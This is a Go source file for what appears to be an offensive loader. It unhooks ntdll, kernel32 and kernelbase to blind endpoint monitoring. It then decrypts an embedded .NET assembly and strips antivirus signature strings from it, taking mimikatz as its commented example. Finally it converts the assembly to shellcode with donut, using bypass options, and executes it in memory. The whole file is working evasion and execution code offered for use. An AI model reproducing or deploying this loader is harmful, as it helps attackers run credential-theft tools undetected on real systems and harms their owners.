package main

import (
	"fmt"
	"golang.org/x/sys/windows/registry"
	"log"
	"os"
	"strconv"
	"strings"

	"github.com/timwhitez/Doge-Assembly/donut"
	"github.com/timwhitez/Doge-Assembly/loader"
)

var Version string
func init(){
	Version = versionFunc()
	if Version == "10.0" {
		err := RefreshPE(`c:\windows\system32\kernel32.dll`)
		if err != nil {
			log.Println("RefreshPE failed:", err)
		}
		err = RefreshPE(`c:\windows\system32\kernelbase.dll`)
		if err != nil {
			log.Println("RefreshPE failed:", err)
		}
		fmt.Println("\nAll Dll Unhooked!\n")
		err = RefreshPE(`c:\windows\system32\ntdll.dll`)
		if err != nil {
			log.Println("RefreshPE failed:", err)
		}
	}

}
func versionFunc() string {
	k, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
	Version, _, _ :=  k.GetStringValue("CurrentVersion")
	majorVersion, _, err := k.GetIntegerValue("CurrentMajorVersionNumber")
	if err == nil{
		minorVersion, _, _ := k.GetIntegerValue("CurrentMinorVersionNumber")
		Version = strconv.FormatUint(majorVersion, 10) + "." + strconv.FormatUint(minorVersion, 10)
	}
	defer k.Close()

	return Version
}

func main() {


	blacklist := []string{
		//以mimikatz为例，恶意字符串替换
		/*
		"mimikatz",
		"delpy",
		"benjamin",
		"delpy",
		"vincent",
		"le toux",
		"letoux",
		"amour",
		"la vie",
		"gentilkiwi",
		"kiwi",
		"creativecommons",
		".#####.",
		".####.",
		".## ^ ##.",
		"## v ##",

		 */
	}

	entropy := 3

	//  -PIC/SHELLCODE OPTIONS-
	archStr := "x64"
	bypass := 3
	format := 1
	action := 1

	//  -FILE OPTIONS-

	zFlag := 1

	// go-donut only flags
	params := ""
	if len(os.Args) > 1 {
		for i := 1 ;i < len(os.Args);i++{
			if i == 1 {
				params = os.Args[i]
			}else{
				params = params + " " + os.Args[i]
			}
		}
	}


	var err error
	oep := uint64(0)

	var donutArch donut.DonutArch
	switch strings.ToLower(archStr) {
	case "x32", "386":
		donutArch = donut.X32
	case "x64", "amd64":
		donutArch = donut.X64
	case "x84":
		donutArch = donut.X84
	default:
		donutArch = donut.X64
	}

	config := new(donut.DonutConfig)
	config.Arch = donutArch
	config.Entropy = uint32(entropy)
	config.OEP = oep
	config.InstType = donut.DONUT_INSTANCE_PIC

	config.Parameters = params
	config.Bypass = bypass
	config.Compress = uint32(zFlag)
	config.Format = uint32(format)
	config.Thread = 1

	config.ExitOpt = uint32(action)

	key, err := Asset("data/aeskey.txt")
	if err != nil {
		panic(err)
	}

	var assemblyBytesci []byte
	var er error

	for _,i := range AssetNames(){
		if !strings.Contains(strings.ToLower(i),"aeskey"){
			fmt.Println(i)
			assemblyBytesci, er = Asset(i)
		}
	}
	//assemblyBytesci, er = Asset("data/sharp.exe.cipher")
	if er != nil {
		panic(er)
	}

	/*
	version, er := Asset("data/version.txt")

	 */

	assemblyBytes := decrypt(assemblyBytesci,key)

	assemblyBytes = loader.ObfuscateStrings(assemblyBytes,blacklist)

	payload, err := donut.ShellcodeFromFile(config, assemblyBytes)
	if err == nil {
		b := payload.Bytes()
		loader.Load(b)
	}

}
